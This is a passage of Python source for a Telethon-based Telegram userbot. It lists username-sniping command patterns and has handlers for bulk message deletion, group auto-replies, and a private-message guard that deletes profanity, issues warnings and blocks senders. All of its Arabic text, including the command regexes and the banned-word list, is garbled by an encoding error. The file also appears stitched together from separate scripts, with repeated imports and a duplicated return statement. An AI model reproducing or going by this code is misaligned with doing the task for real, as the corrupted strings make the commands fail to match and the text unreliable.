    "‚û§ .ÿµŸäÿØ ÿ¥ÿ®Ÿá ÿ±ÿ®ÿßÿπŸä3  - ŸÖÿ´ÿßŸÑ: H_BB_H",
    "‚û§ .ÿµŸäÿØ ÿ¥ÿ®Ÿá ÿ±ÿ®ÿßÿπŸä4  - ŸÖÿ´ÿßŸÑ: H_BB_B",

    "üîµ ÿßŸÑŸäŸàÿ≤ÿ±ÿßÿ™ ÿßŸÑÿÆŸÖÿßÿ≥Ÿäÿ©:",
    "‚û§ .ÿµŸäÿØ ÿÆŸÖÿßÿ≥Ÿä ÿ≠ÿ±ŸÅŸäŸÜ1  - ŸÖÿ´ÿßŸÑ: HHHBR",
    "‚û§ .ÿµŸäÿØ ÿÆŸÖÿßÿ≥Ÿä ÿ≠ÿ±ŸÅŸäŸÜ2  - ŸÖÿ´ÿßŸÑ: H4BBB",
    "‚û§ .ÿµŸäÿØ ÿÆŸÖÿßÿ≥Ÿä ÿßÿ±ŸÇÿßŸÖ  - ŸÖÿ´ÿßŸÑ: HB444",
    "‚û§ .ÿµŸäÿØ ÿÆŸÖÿßÿ≥Ÿä ÿ≠ÿ±ŸÅŸäŸÜ3  - ŸÖÿ´ÿßŸÑ: HBBBR",

    "üü£ ÿßŸÑŸäŸàÿ≤ÿ±ÿßÿ™ ÿßŸÑÿ≥ÿØÿßÿ≥Ÿäÿ©:",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ1  - ŸÖÿ´ÿßŸÑ: HBHHHB",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ2  - ŸÖÿ´ÿßŸÑ: HHHHBB",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ3  - ŸÖÿ´ÿßŸÑ: HHHBBH",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ4  - ŸÖÿ´ÿßŸÑ: HHBBHH",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ5  - ŸÖÿ´ÿßŸÑ: HBBHHH",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ6  - ŸÖÿ´ÿßŸÑ: HHBBBB",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿØÿßÿ≥Ÿä_ÿ¥ÿ±ÿ∑Ÿá  - ŸÖÿ´ÿßŸÑ: HHHH_B",

    "üî¥ ÿßŸÑŸäŸàÿ≤ÿ±ÿßÿ™ ÿßŸÑÿ≥ÿ®ÿßÿπŸäÿ©:",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿ®ÿßÿπŸäÿßÿ™1  - ŸÖÿ´ÿßŸÑ: HHHHHHB",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿ®ÿßÿπŸäÿßÿ™2  - ŸÖÿ´ÿßŸÑ: HHHHHBH",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿ®ÿßÿπŸäÿßÿ™3  - ŸÖÿ´ÿßŸÑ: HHHHBHH",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿ®ÿßÿπŸäÿßÿ™4  - ŸÖÿ´ÿßŸÑ: HHHBHHH",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿ®ÿßÿπŸäÿßÿ™5  - ŸÖÿ´ÿßŸÑ: HHBHHHH",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿ®ÿßÿπŸäÿßÿ™6  - ŸÖÿ´ÿßŸÑ: HBHHHHH",
    "‚û§ .ÿµŸäÿØ ÿ≥ÿ®ÿßÿπŸäÿßÿ™7  - ŸÖÿ´ÿßŸÑ: HBBBBBB",

    "‚ö™ ŸäŸàÿ≤ÿ±ÿßÿ™ ÿßŸÑÿ®Ÿàÿ™ÿßÿ™:",
    "‚û§ .ÿµŸäÿØ ÿ®Ÿàÿ™ÿßÿ™1  - ŸÖÿ´ÿßŸÑ: HB_Bot",
    "‚û§ .ÿµŸäÿØ ÿ®Ÿàÿ™ÿßÿ™2  - ŸÖÿ´ÿßŸÑ: H_BBot",
    "‚û§ .ÿµŸäÿØ ÿ®Ÿàÿ™ÿßÿ™3  - ŸÖÿ´ÿßŸÑ: HB4Bot",
    "‚û§ .ÿµŸäÿØ ÿ®Ÿàÿ™ÿßÿ™4  - ŸÖÿ´ÿßŸÑ: H4BBot",
    "‚û§ .ÿµŸäÿØ ÿ®Ÿàÿ™ÿßÿ™5  - ŸÖÿ´ÿßŸÑ: H44Bot",
    "‚û§ .ÿµŸäÿØ ÿ®Ÿàÿ™ÿßÿ™6  - ŸÖÿ´ÿßŸÑ: HRBBot",
    "‚û§ .ÿµŸäÿØ ÿ®Ÿàÿ™ÿßÿ™7  - ŸÖÿ´ÿßŸÑ: HHBBot - HH4Bot",
    "‚û§ .ÿµŸäÿØ ÿ®Ÿàÿ™ÿßÿ™8  - ŸÖÿ´ÿßŸÑ: HHBBot",
    "‚û§ `.ÿµŸäÿØ ÿ®Ÿàÿ™ÿßÿ™9`  - ŸÖÿ´ÿßŸÑ: HH4Bot",

    "üõ† ŸÑÿ•ÿ∏Ÿáÿßÿ± ÿ£ŸàÿßŸÖÿ± ÿßŸÑÿµŸäÿØ ŸàÿßŸÑÿ™ÿ´ÿ®Ÿäÿ™ ÿßŸÑÿ£ÿ≥ÿßÿ≥Ÿäÿ©:",
    "‚û§ ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿ£ŸÖÿ±: .ÿßŸÑÿµŸäÿØ ÿ£Ÿà .ÿßŸÑÿ™ÿ´ÿ®Ÿäÿ™",
]

@client.on(events.NewMessage(pattern=r"\.ŸÜŸàÿπ$", outgoing=True))
async def show_time_formats(event):
    formats_text = "\n".join(time_formats)
    await event.respond(f"üöÄ ŸÇÿßÿ¶ŸÖÿ© ÿ£ŸÜŸàÿßÿπ ÿßŸÑŸäŸàÿ≤ÿ±ÿßÿ™ ÿßŸÑŸÖÿ™ÿßÿ≠ÿ© ŸÑŸÑÿµŸäÿØ üöÄ:\n\n{formats_text}")
    await event.delete()

@client.on(events.NewMessage(pattern=r'^.ŸÖÿ≥ÿ≠ (\d+)$'))
async def delete_messages(event):
    count = int(event.pattern_match.group(1))  
    chat = event.chat_id  

    async for message in client.iter_messages(chat, limit=count):
        await message.delete()

    await event.edit(f'ÿ™ŸÖ ŸÖÿ≥ÿ≠ {count} ÿ±ÿ≥ÿßŸÑÿ© ÿ®ŸÜÿ¨ÿßÿ≠!', delete_after=5)  

@client.on(events.NewMessage(pattern=r'^.ŸÖÿ≥ÿ≠ ÿ±ÿ≥ÿßÿ¶ŸÑŸä$'))
async def delete_my_messages(event):
    chat = event.chat_id
    user_id = event.sender_id  
    async for message in client.iter_messages(chat, from_user=user_id):
        await message.delete()

    await event.edit('ÿ™ŸÖ ŸÖÿ≥ÿ≠ ÿ¨ŸÖŸäÿπ ÿ±ÿ≥ÿßÿ¶ŸÑŸÉ!', delete_after=5)  
    


try:
    with open("private_protection.json", "r") as f:
        protection_data = json.load(f)
except (FileNotFoundError, json.JSONDecodeError):
    protection_data = {
        "enabled": True,
        "banned_words": [
            "ŸÉÿ≥ŸÖŸÉ", "ÿßŸÜŸäŸÉ ÿßŸÖŸÉ", "ŸÇÿ≠ÿ®ÿ©", "ÿ¥ÿ±ŸÖŸàÿ∑ÿ©", "ÿ≤ÿ®Ÿä", "ŸÖÿ™ŸÜÿßŸÉ", "ÿÆŸàŸÑ", "ÿπÿßŸáÿ±ÿ©", 
            "ÿ≤ÿ®", "ÿπÿ±ÿµ", "ŸÇŸàÿßÿØ", "ÿ≠ŸäŸàÿßŸÜ", "ÿ≤ÿ®ÿßŸÑÿ©", "ŸÖŸÑÿπŸàŸÜ", "ÿ™ŸÅ ÿπŸÑŸäŸÉ", "ŸÉÿ≠ÿ®ÿ©", "ŸÉŸÑÿ®",
            "ŸäŸÑÿπŸÜ ÿ¥ŸÉŸÑŸÉ", "Ÿäÿß ÿßÿ®ŸÜ ÿßŸÑŸÉŸÑÿ®", "ÿßÿ®ŸÜ ÿßŸÑŸÖÿ™ŸÜÿßŸÉŸá", "ÿßÿ®ŸÜ ÿßŸÑŸàÿ≥ÿÆÿ©", "ÿ™ŸÅŸà ÿπŸÑŸäŸÉ", 
            "ŸäŸÑÿπŸÜ ÿØŸäŸÜŸÉ", "ÿπÿ±ÿµ ÿßÿ®ŸÜ ÿπÿ±ÿµ", "ŸÖÿ™ŸÜÿßŸÉ ÿßÿ®ŸÜ ÿßŸÑŸÖÿ™ŸÜÿßŸÉ", "ŸÇÿ≠ÿ®", "ÿ≤ŸÜÿßÿÆÿ©", "Ÿàÿ≥ÿÆ", 
            "ŸÖŸÜŸäŸÉ", "ÿ®ŸÜÿ™ ÿßŸÑŸÇÿ≠ÿ®ÿ©", "ÿßÿ®ŸÜ ÿßŸÑÿ¥ÿ±ŸÖŸàÿ∑ÿ©", "ÿÆŸÜÿ≤Ÿäÿ±", "ŸÇÿ∞ÿßÿ±ÿ©", "ŸÜÿ™ŸÜ", "ŸÜÿ¨ÿ≥", 
            "ÿπÿØŸäŸÖ ÿßŸÑÿ¥ÿ±ŸÅ", "ÿπÿ®Ÿäÿ∑", "ÿ∫ÿ®Ÿä", "ÿ≠ŸÖÿßÿ±", "ÿ®ÿ∫ŸÑ", "ŸÇŸÑŸäŸÑ ÿßŸÑÿ£ÿØÿ®", "ÿ≥ÿßŸÅŸÑ", 
            "Ÿàÿ≥ÿÆ ÿßÿ®ŸÜ Ÿàÿ≥ÿÆÿ©", "ÿ≠ÿ´ÿßŸÑÿ©", "Ÿàÿ∂Ÿäÿπ", "ŸÖŸÑÿπŸàŸÜ ÿßŸÑŸàÿßŸÑÿØŸäŸÜ", "ÿßÿ®ŸÜ ÿßŸÑÿ≤ŸÜÿß", "ÿØŸäŸàÿ´", 
            "ÿßŸÑŸÉŸÑÿ® ÿßÿ®ŸÜ ÿßŸÑŸÉŸÑÿ®", "ÿßŸÑŸÖŸÜÿßŸäŸÉ", "ÿßÿ®ŸÜ ÿßŸÑÿπÿßŸáÿ±ÿ©", "ŸÇŸÑŸäŸÑ ÿßŸÑÿ≠Ÿäÿßÿ°", "ÿ≥ÿßŸÅŸÑ ŸÖŸÜÿ≠ÿ∑",
            "ŸÅÿßÿ≥ŸÇ", "ŸÉÿßŸÅÿ±", "ÿÆŸÜŸäÿ´", "Ÿàÿßÿ∑Ÿä", "ŸÖŸÜÿ≠ÿ∑", "ÿ≠ÿ´ÿßŸÑÿ© ÿßŸÑŸÖÿ¨ÿ™ŸÖÿπ", "ÿ≠ŸÇŸäÿ±", "ÿ™Ÿäÿ≥", 
            "ÿ™ÿßŸÅŸá", "ŸÖÿß ÿπŸÜÿØŸÉ ÿ±ÿ¨ŸàŸÑÿ©", "ŸÖÿ≥ÿÆÿ±ÿ©", "Ÿàÿ∂Ÿäÿπ", "ÿ≤ŸÅÿ™", "ŸÖÿπŸÅŸÜ", "ÿßŸÜÿ¨ÿ≥ ÿßŸÑŸÜÿßÿ≥", 
            "ÿßÿÆÿ≥ ÿßŸÑÿ®ÿ¥ÿ±", "ÿßŸÜÿ™ ŸàŸÑÿß ÿ¥Ÿä", "ÿÆŸÜÿ≤Ÿäÿ± ŸÇÿ∞ÿ±", "ŸÖŸÑÿπŸàŸÜ ÿ£ÿ®ŸàŸÉ", "ÿßŸÜÿπŸÑ ÿßÿ®Ÿà ÿ¥ŸÉŸÑŸÉ"
        ],
        "warnings": {}  
    }

def save_protection_data():
    """ÿ≠ŸÅÿ∏ ÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑÿ≠ŸÖÿßŸäÿ© ÿ•ŸÑŸâ ŸÖŸÑŸÅ JSON."""
    with open("private_protection.json", "w") as f:
        json.dump(protection_data, f, indent=4)

@client.on(events.NewMessage(pattern=r"^.ÿ≠ŸÖÿßŸäÿ© ÿßŸÑÿÆÿßÿµ$"))
async def toggle_protection(event):
    protection_data["enabled"] = not protection_data["enabled"]
    save_protection_data()
    status = "**‚éô ŸÖŸÅÿπŸÑÿ©**" if protection_data["enabled"] else "**‚éô ŸÖÿπÿ∑ŸÑÿ©**"
    await event.edit(f"**‚éô ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± Ÿàÿ∂ÿπ ÿ≠ŸÖÿßŸäÿ© ÿßŸÑÿÆÿßÿµ ÿ•ŸÑŸâ:** {status}")

@client.on(events.NewMessage)
async def delete_bad_words(event):
    if not protection_data["enabled"]:
        return

    if event.is_private and event.text:
        user_id = str(event.sender_id)
        text_lower = event.text.lower()

        for word in protection_data["banned_words"]:
            
            if re.search(rf"\b{re.escape(word)}\b", text_lower):
                try:
                    await event.delete()
                except Exception as e:
                    print(f"ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ≠ÿ∞ŸÅ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©: {e}")

                
                protection_data["warnings"][user_id] = protection_data["warnings"].get(user_id, 0) + 1
                save_protection_data()

                warnings_count = protection_data["warnings"][user_id]

                if warnings_count >= 3:
                    try:
                        await event.respond("**‚éô ÿ™ŸÖ ÿ≠ÿ∏ÿ±ŸÉ ÿ®ÿ≥ÿ®ÿ® ÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸÉ ŸÉŸÑŸÖÿßÿ™ ÿ∫Ÿäÿ± ŸÑÿßÿ¶ŸÇÿ©!**")
                        await client(functions.contacts.BlockRequest(event.sender_id))
                    except Exception as e:
                        print(f"ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿßŸÑÿ≠ÿ∏ÿ±: {e}")

                    del protection_data["warnings"][user_id]  
                    save_protection_data()
                else:
                    remaining_warnings = 3 - warnings_count
                    await event.respond(f"‚éô ÿ™ÿ≠ÿ∞Ÿäÿ± {warnings_count}/3 ‚ö†Ô∏è\n"
                                        f"‚éô ŸÑÿß ÿ™ÿ∫ŸÑÿ∑ ŸÑÿßŸÜŸÉ ÿ±ÿßÿ≠ ÿ™ŸÜŸáÿßŸÜ {remaining_warnings} ÿ™ÿ≠ÿ∞Ÿäÿ±{'ÿßÿ™' if remaining_warnings > 1 else ''}!")

                break  
                              

import os
import json
from telethon import events

data_file = "responses.json"

def load_data():
    """ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ŸÖŸÜ ŸÖŸÑŸÅ JSON ŸÖÿπ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿ≥ŸÑÿßŸÖÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™."""
    if not os.path.exists(data_file) or os.stat(data_file).st_size == 0:
        return {"responses": {}, "enabled_groups": set()}

    try:
        with open(data_file, "r", encoding="utf-8") as f:
            data = json.load(f)
            return {
                "responses": data.get("responses", {}),
                "enabled_groups": set(data.get("enabled_groups", [])),
            }
    except Exception as e:
        print(f"ÿÆÿ∑ÿ£ ŸÅŸä ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™: {e}")
        return {"responses": {}, "enabled_groups": set()}

def save_data():
    """ÿ≠ŸÅÿ∏ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿ•ŸÑŸâ ŸÖŸÑŸÅ JSON."""
    global responses, enabled_groups
    with open(data_file, "w", encoding="utf-8") as f:
        json.dump({
            "responses": responses,
            "enabled_groups": list(enabled_groups)
        }, f, ensure_ascii=False, indent=4)

data = load_data()
responses = data["responses"]
enabled_groups = data["enabled_groups"]

@client.on(events.NewMessage(pattern=r".ÿßÿ∂ŸÅ ÿ±ÿØ \+ (.+) \+ (.+)"))
async def add_response(event):
    """ÿ•ÿ∂ÿßŸÅÿ© ÿ±ÿØ ÿ¨ÿØŸäÿØ"""
    try:
        _, key, value = event.raw_text.split(" + ", 2)
        responses[key.strip()] = value.strip()
        save_data()
        await event.edit(f"‚éô ÿ™ŸÖ **ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ±ÿØ** ÿ®ŸÜÿ¨ÿßÿ≠:\n**{key} ‚Üí {value}**")
    except ValueError:
        await event.edit("‚éô ÿßŸÑÿµŸäÿ∫ÿ© ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠ÿ©. ÿßŸÑÿ±ÿ¨ÿßÿ° ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ: `.ÿßÿ∂ŸÅ ÿ±ÿØ + ÿßŸÑŸÉŸÑŸÖÿ© + ÿßŸÑÿ±ÿØ`")

@client.on(events.NewMessage(pattern=r".ÿßŸÑÿ±ÿØŸàÿØ"))
async def list_responses(event):
    """ÿπÿ±ÿ∂ ÿ¨ŸÖŸäÿπ ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑŸÖÿÆÿ≤ŸÜÿ©"""
    if responses:
        msg = "**‚éô ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑŸÖÿÆÿ≤ŸÜÿ©:**\n\n" + "\n".join([f"‚éô **{k}** ‚Üí {v}" for k, v in responses.items()])
    else:
        msg = "‚éô ŸÑÿß ÿ™Ÿàÿ¨ÿØ ÿ±ÿØŸàÿØ ŸÖÿÆÿ≤ŸÜÿ©."
    
    await event.reply(msg)

@client.on(events.NewMessage(pattern=r".ÿ™ŸÅÿπŸäŸÑ ŸáŸÜÿß"))
async def enable_group(event):
    """ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿäÿ© ŸÅŸä ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©"""
    chat_id = event.chat_id
    enabled_groups.add(chat_id)
    save_data()
    await event.edit("**‚éô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿäÿ© ŸÅŸä Ÿáÿ∞Ÿá ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©.**")

@client.on(events.NewMessage(pattern=r".ÿ™ÿπÿ∑ŸäŸÑ ŸáŸÜÿß"))
async def disable_group(event):
    """ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿäÿ© ŸÅŸä ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©"""
    chat_id = event.chat_id
    if chat_id in enabled_groups:
        enabled_groups.remove(chat_id)
        save_data()
        await event.edit("**‚éô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿäÿ© ŸÅŸä Ÿáÿ∞Ÿá ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©.**")
    else:
        await event.edit("**‚éô ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿäÿ© ÿ∫Ÿäÿ± ŸÖŸÅÿπŸÑÿ© ŸáŸÜÿß.**")

@client.on(events.NewMessage)
async def auto_reply(event):
    """ÿßŸÑÿ±ÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ÿπŸÜÿØ ÿ™ÿ∑ÿßÿ®ŸÇ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ŸÅŸä ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑŸÖŸÅÿπŸÑÿ©"""
    if event.chat_id in enabled_groups:
        text = event.raw_text.strip()
        if text in responses:
            await event.reply(responses[text])
         
import json
from telethon import events
from telethon.tl.functions.contacts import BlockRequest

OWNER_ID = 6383191007  # ÿ∂ÿπ ŸÖÿπÿ±ŸÅŸÉ ŸáŸÜÿß

# ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™
try:
    with open("warnings.json", "r") as f:
        data = json.load(f)
except (FileNotFoundError, json.JSONDecodeError):
    data = {
        "warnings": {},
        "whitelist": [],
        "max_warnings": 5,
        "warnings_enabled": True,
        "warning_message": "‚éô ÿ™ÿ≠ÿ∞Ÿäÿ± {warnings}/{max_warnings}\n‚éô Ÿäÿ±ÿ¨Ÿâ ÿπÿØŸÖ ÿßŸÑÿ•ÿ≤ÿπÿßÿ¨ Ÿàÿ•ŸÑÿß ÿ≥Ÿäÿ™ŸÖ ÿ≠ÿ∏ÿ±ŸÉ ÿ™ŸÑŸÇÿßÿ¶ŸäŸãÿß!"
    }

def save_data():
    with open("warnings.json", "w") as f:
        json.dump(data, f, indent=4)

@client.on(events.NewMessage(incoming=True))
async def handle_private_messages(event):
    if not event.is_private or not data.get("warnings_enabled", False):
        return

    sender = await event.get_sender()
    user_id = sender.id

    if user_id == (await client.get_me()).id:
        return
        return
    if user_id == OWNER_ID:
        return

    user_id_str = str(user_id)
    data["warnings"].setdefault(user_id_str, 0)
    data["warnings"][user_id_str] += 1
    save_data()

    warnings = data["warnings"][user_id_str]
    max_warnings = data.get("max_warnings", 5)

    if warnings >= max_warnings:
        await event.respond(f"**‚éô ÿ™ŸÖ ÿ≠ÿ∏ÿ±ŸÉ ÿ®ÿ≥ÿ®ÿ® ÿ™ÿ¨ÿßŸàÿ≤ ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ ({max_warnings})!**")
        await client(BlockRequest(user_id))
    else:
        msg = data.get("warning_message", "‚éô ÿ™ÿ≠ÿ∞Ÿäÿ± {warnings}/{max_warnings}").format(warnings=warnings, max_warnings=max_warnings)
        await event.reply(msg)

@client.on(events.NewMessage(pattern=r"^.ŸÇÿ®ŸàŸÑ$"))
async def accept_user(event):
    if event.is_group or event.is_channel:
        return

    reply = await event.get_reply_message()
    if not reply:
        await event.edit("**‚éô Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÑŸÇÿ®ŸàŸÑŸá.**")
        return

    sender = await reply.get_sender()
    user_id = sender.id

    if user_id not in data["whitelist"]:
        data["whitelist"].append(user_id)
        save_data()

    await event.edit("**‚éô ÿ™ŸÖ ŸÇÿ®ŸàŸÑ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖÿå ŸÑŸÜ Ÿäÿ™ŸÑŸÇŸâ ÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ ÿ®ÿπÿØ ÿßŸÑÿ¢ŸÜ.**")

@client.on(events.NewMessage(pattern=r"^.ÿßŸÑÿ∫ÿßÿ° ÿßŸÑŸÇÿ®ŸàŸÑ$"))
async def remove_acceptance(event):
    if event.is_group or event.is_channel:
        return

    reply = await event.get_reply_message()
    if not reply:
        await event.edit("**‚éô Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÑÿ•ŸÑÿ∫ÿßÿ° ŸÇÿ®ŸàŸÑŸá.**")
        return

    sender = await reply.get_sender()
    user_id = sender.id

    if user_id in data["whitelist"]:
        data["whitelist"].remove(user_id)
        save_data()

    await event.edit("**‚éô ÿ™ŸÖ ÿ•ŸÑÿ∫ÿßÿ° ŸÇÿ®ŸàŸÑ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖÿå ÿ≥Ÿäÿ™ŸÑŸÇŸâ ÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ ÿπŸÜÿØ ÿßŸÑŸÖÿ±ÿßÿ≥ŸÑÿ©.**")

@client.on(events.NewMessage(pattern=r"^.ŸÖÿ≥ÿ≠ ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™$"))
async def clear_warnings(event):
    if event.is_group or event.is_channel:
        return

    reply = await event.get_reply_message()
    if not reply:
        await event.edit("**‚éô Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÑŸÖÿ≥ÿ≠ ÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™Ÿá.**")
        return

    sender = await reply.get_sender()
    user_id = sender.id

    if str(user_id) in data["warnings"]:
        del data["warnings"][str(user_id)]
        save_data()

    await event.edit("**‚éô ÿ™ŸÖ ŸÖÿ≥ÿ≠ ÿ¨ŸÖŸäÿπ ÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ.**")

@client.on(events.NewMessage(pattern=r"^.ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™$"))
async def show_warnings(event):
    if event.is_group or event.is_channel:
        return

    sender = await event.get_sender()
    user_id = sender.id

    warnings = data["warnings"].get(str(user_id), 0)
    max_warnings = data["max_warnings"]
    await event.edit(f"**‚éô ŸÑÿØŸäŸÉ {warnings} ŸÖŸÜ {max_warnings} ÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™.**")

@client.on(events.NewMessage(pattern=r"^.ÿ™ÿπŸäŸäŸÜ ŸÉŸÑŸäÿ¥ÿ© ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±$"))
async def change_warning_message(event):
    reply = await event.get_reply_message()
    if not reply:
        await event.edit("**‚éô Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿ™ÿ≠ÿ™ŸàŸä ÿπŸÑŸâ ÿßŸÑŸÉŸÑŸäÿ¥ÿ© ÿßŸÑÿ¨ÿØŸäÿØÿ©.**")
        return

    new_message = reply.text
    data["warning_message"] = new_message
    save_data()
    await event.edit("**‚éô ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ŸÉŸÑŸäÿ¥ÿ© ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ± ÿ®ŸÜÿ¨ÿßÿ≠!**")

@client.on(events.NewMessage(pattern=r"^.ÿπÿ±ÿ∂ ŸÉŸÑŸäÿ¥ÿ©$"))
async def show_warning_message(event):
    if event.is_group or event.is_channel:
        return

    await event.edit(f"**‚éô ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ± ÿßŸÑÿ≠ÿßŸÑŸäÿ©:\n\n{data['warning_message']}**")

@client.on(events.NewMessage(pattern=r"^.ÿπÿØÿØ ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ (\d+)$"))
async def change_max_warnings(event):
    if event.is_group or event.is_channel:
        return

    try:
        new_limit = int(event.pattern_match.group(1))
        if new_limit <= 0:
            await event.edit("**‚éô ÿßŸÑÿ≠ÿØ ÿßŸÑÿ£ŸÇÿµŸâ ŸÑŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ Ÿäÿ¨ÿ® ÿ£ŸÜ ŸäŸÉŸàŸÜ ÿ£ŸÉÿ®ÿ± ŸÖŸÜ ÿµŸÅÿ±.**")
            return
    except ValueError:
        await event.edit("**‚éô Ÿäÿ¨ÿ® ÿ•ÿØÿÆÿßŸÑ ÿ±ŸÇŸÖ ÿµÿ≠Ÿäÿ≠.**")
        return

    data["max_warnings"] = new_limit
    save_data()
    await event.edit(f"**‚éô ÿ™ŸÖ ÿ™ÿπÿØŸäŸÑ ÿßŸÑÿ≠ÿØ ÿßŸÑÿ£ŸÇÿµŸâ ŸÑŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ ÿ•ŸÑŸâ {new_limit}.**")

@client.on(events.NewMessage(pattern=r"^.ÿßŸÑŸÖÿ≠ÿ∏Ÿàÿ±ŸäŸÜ$"))
async def show_banned_users(event):
    if event.is_group or event.is_channel:
        return

    banned_users = [user_id for user_id, count in data["warnings"].items() if count >= data["max_warnings"]]
    if not banned_users:
        await event.edit("**‚éô ŸÑÿß ŸäŸàÿ¨ÿØ ŸÖÿ≥ÿ™ÿÆÿØŸÖŸàŸÜ ŸÖÿ≠ÿ∏Ÿàÿ±ŸàŸÜ ÿ≠ÿßŸÑŸäŸãÿß.**")
    else:
        banned_list = "\n".join(f"‚éô {user_id}" for user_id in banned_users)
        await event.edit(f"‚éô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖÿ≠ÿ∏Ÿàÿ±ŸäŸÜ:\n{banned_list}")

@client.on(events.NewMessage(pattern=r"^.ŸÖÿ≥ÿ≠ ÿßŸÑŸÖÿ≠ÿ∏Ÿàÿ±ŸäŸÜ$"))
async def clear_banned_users(event):
    if event.is_group or event.is_channel:
        return

    data["warnings"] = {user_id: count for user_id, count in data["warnings"].items() if count < data["max_warnings"]}
    save_data()
    await event.edit("**‚éô ÿ™ŸÖ ŸÖÿ≥ÿ≠ ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ≠ÿ∏Ÿàÿ±ŸäŸÜ.**")

@client.on(events.NewMessage(pattern=r"^.ÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™Ÿä$"))
async def my_warnings(event):
    if not event.is_private:
        return
    sender = await event.get_sender()
    user_id = str(sender.id)
    warnings = data.get("warnings", {}).get(user_id, 0)
    max_warnings = data.get("max_warnings", 5)
